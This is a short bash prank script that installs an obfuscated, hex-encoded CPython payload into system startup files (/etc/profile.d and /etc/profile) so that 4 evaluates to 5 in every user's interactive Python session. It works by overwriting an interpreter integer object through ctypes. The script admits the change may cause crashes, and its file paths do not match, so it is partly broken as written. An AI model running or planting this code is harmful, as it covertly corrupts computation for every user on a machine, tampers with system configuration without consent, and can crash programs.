#!/bin/bash
# Make 4 evaluate to be 5 in python. It's very confusing and highly annoying
# Should not result in an immediate segfault, but who cares, right?
set +e

# A devlish cpython payload. The hex in the exec does the following:
# from ctypes import c_int8
# from struct import calcsize
# c_int8.from_address(id(4) + calcsize('PP')).value = 5
payload=$(cat << EOF
exec('\
\x66\x72\x6f\x6d\x20\x63\x74\x79\
\x70\x65\x73\x20\x69\x6d\x70\x6f\
\x72\x74\x20\x63\x5f\x69\x6e\x74\
\x38\x3b\x20\x69\x6d\x70\x6f\x72\
\x74\x20\x73\x74\x72\x75\x63\x74\
\x3b\x20\x63\x5f\x69\x6e\x74\x38\
\x2e\x66\x72\x6f\x6d\x5f\x61\x64\
\x64\x72\x65\x73\x73\x28\x69\x64\
\x28\x34\x29\x20\x2b\x20\x73\x74\
\x72\x75\x63\x74\x2e\x63\x61\x6c\
\x63\x73\x69\x7a\x65\x28\x27\x50\
\x50\x27\x29\x29\x2e\x76\x61\x6c\
\x75\x65\x3d\x35')
EOF
)

touch /etc/profile.d/pythonstartup.py
echo $payload > /etc/profile.d/pythonstartup.py
echo "PYTHONSTARTUP='/etc/pythonstartup.py'" >> /etc/profile
